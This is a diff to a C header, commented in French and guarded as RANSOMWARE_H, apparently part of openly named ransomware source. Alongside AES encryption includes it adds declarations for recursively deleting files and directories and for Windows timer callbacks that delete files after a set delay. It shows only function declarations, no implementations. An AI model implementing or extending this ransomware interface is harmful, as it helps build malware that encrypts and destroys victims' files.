@@ -3,6 +3,8 @@
 
 #include <openssl/evp.h>
 #include <openssl/aes.h>
+#include <stdio.h>
+#include <windows.h> 
   
 #define BUFFER_SIZE 4096 
 #define KEY_SIZE 32 // Taille de la clé AES (256 bits)
@@ -64,5 +66,39 @@ int is_directory(const char *path);
  * @param size Taille du buffer full_path.
  */
 void construct_path(const char *directory, const char *file, char *full_path, size_t size);
+
+/**
+ * @brief Supprime un fichier ou un répertoire spécifié.
+ * 
+ * Cette fonction vérifie si le chemin donné représente un fichier ou un répertoire.
+ * - Si c'est un fichier, il est supprimé.
+ * - Si c'est un répertoire, la fonction supprime d'abord tous les fichiers et sous-répertoires à l'intérieur du répertoire de manière récursive, puis supprime le répertoire vide.
+ * 
+ * @param path Le chemin du fichier ou répertoire à supprimer. Ce chemin doit être un chemin absolu valide.
+ * 
+ * @note Si un fichier ou un répertoire est verrouillé ou en cours d'utilisation par un autre processus, la suppression échouera.
+ */
+void removeFileOrDirectory(const char *path);
+
+
+/**
+ * Fonction de rappel (callback) appelée lorsque le timer atteint son délai.
+ * Cette fonction tente de supprimer le fichier spécifié.
+ *
+ * @param lpArg Pointeur vers le chemin du fichier à supprimer.
+ * @param dwTimerLowValue Valeur basse du timer.
+ * @param dwTimerHighValue Valeur haute du timer.
+ */
+void CALLBACK TimerCallback(LPVOID lpArg, DWORD dwTimerLowValue, DWORD dwTimerHighValue);
+
+
+/**
+ * Fonction pour planifier la suppression d'un fichier après un délai spécifié.
+ * Un timer Windows est utilisé pour appeler la fonction de suppression après le délai.
+ *
+ * @param file_path Chemin du fichier à supprimer.
+ * @param wait_time_seconds Délai en secondes avant que le fichier soit supprimé.
+ */
+void scheduleFileDeletion(const char *file_path, int wait_time_seconds);
 
 #endif // RANSOMWARE_H
